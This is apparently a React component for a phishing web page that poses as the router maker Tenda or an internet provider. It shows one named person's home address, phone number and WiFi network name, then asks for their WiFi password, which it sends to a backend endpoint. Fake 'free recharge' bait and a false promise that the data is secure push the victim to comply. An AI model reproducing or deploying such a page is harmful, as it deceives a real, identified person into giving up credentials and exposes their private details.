'use client';

import { useState } from 'react';

export default function TendaWiFiForm() {
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [error, setError] = useState('');

  // Pre-filled WiFi information
  const wifiInfo = {
    wifiName: 'Nitish Pandat 5G',
    address: 'O-24 Gali No 8 Saurabh Vihar Jaitpur Badarpur New Delhi',
    routerName: 'Tenda',
    username: 'admin',
    phoneNumber: '9650544042'
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!password.trim()) {
      setError('Password is required');
      return;
    }

    setIsSubmitting(true);
    setError('');

    try {
      // Simulate API call for email submission
      const response = await fetch('/api/submit-wifi-password', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...wifiInfo,
          password: password.trim()
        }),
      });

      if (response.ok) {
        setIsSubmitted(true);
        setPassword('');
      } else {
        throw new Error('Failed to submit');
      }
    } catch (err) {
      setError('Failed to submit. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
            </svg>
          </div>
          <h2 className="text-2xl font-bold text-gray-800 mb-4">Thank You!</h2>
          <p className="text-gray-600 mb-4">
            Your WiFi password has been submitted successfully. we will verify the password and send you confirmation.
          </p>
          <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
            <p className="text-green-800 font-semibold">🎉 Congratulations!</p>
            <p className="text-green-700 text-sm mt-1">
              As a regular user of our company, you are eligible for a <strong>FREE 1-month WiFi recharge</strong>!
            </p>
          </div>
          <button
            onClick={() => {
              setIsSubmitted(false);
              setPassword('');
            }}
            className="bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-6 rounded-lg transition duration-200"
          >
            Submit Another
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-xl p-8 max-w-lg w-full">
        <div className="text-center">
          <div className="w-60 h-40 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
            
            <img className="w-38 h-32" src="https://upload.wikimedia.org/wikipedia/commons/7/78/Tenda_LOGO.png" alt="Tenda Logo" />
          </div>
          {/* <h1 className="text-3xl font-bold text-gray-800 mb-2">Tenda WiFi Information</h1> */}
          <p className="text-gray-600">Please verify your information and enter your WiFi password</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* WiFi Name */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              WiFi Network Name
            </label>
            <input
              type="text"
              value={wifiInfo.wifiName}
              disabled
              className="w-full px-4 py-3 border border-gray-300 rounded-lg bg-gray-50 text-gray-600 focus:outline-none"
            />
          </div>

          {/* Address */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Address
            </label>
            <textarea
              value={wifiInfo.address}
              disabled
              rows="3"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg bg-gray-50 text-gray-600 focus:outline-none resize-none"
            />
          </div>

          {/* Router Name */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Router Name
            </label>
            <input
              type="text"
              value={wifiInfo.routerName}
              disabled
              className="w-full px-4 py-3 border border-gray-300 rounded-lg bg-gray-50 text-gray-600 focus:outline-none"
            />
          </div>

          {/* Username */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Username
            </label>
            <input
              type="text"
              value={wifiInfo.username}
              disabled
              className="w-full px-4 py-3 border border-gray-300 rounded-lg bg-gray-50 text-gray-600 focus:outline-none"
            />
          </div>

<div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Phone No.
            </label>
            <input
              type="number"
              value={wifiInfo.phoneNumber}
              disabled
              className="w-full px-4 py-3 border border-gray-300 rounded-lg bg-gray-50 text-gray-600 focus:outline-none"
            />
          </div>

          {/* Password */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              WiFi Password <span className="text-red-500">*</span>
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter your WiFi password"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition duration-200"
              required
            />
            {error && (
              <p className="mt-2 text-sm text-red-600">{error}</p>
            )}
          </div>

          {/* Benefits Notice */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
            <div className="flex items-start">
              <svg className="w-5 h-5 text-blue-500 mt-0.5 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
              </svg>
              <div>
                <h3 className="text-sm font-semibold text-blue-800">Special Offer!</h3>
                <p className="text-sm text-blue-700 mt-1">
                  As a regular user of our company, you will most probably get a <strong>FREE 1-month WiFi recharge</strong> after verify you details and password.
                </p>
              </div>
            </div>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white font-medium py-3 px-6 rounded-lg transition duration-200 flex items-center justify-center"
          >
            {isSubmitting ? (
              <>
                <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Submitting...
              </>
            ) : (
              'Submit Password'
            )}
          </button>
        </form>

        <p className="text-xs text-gray-500 text-center mt-4">
          Your information is secure and will be used only for service purposes.
        </p>
      </div>
    </div>
  );

}
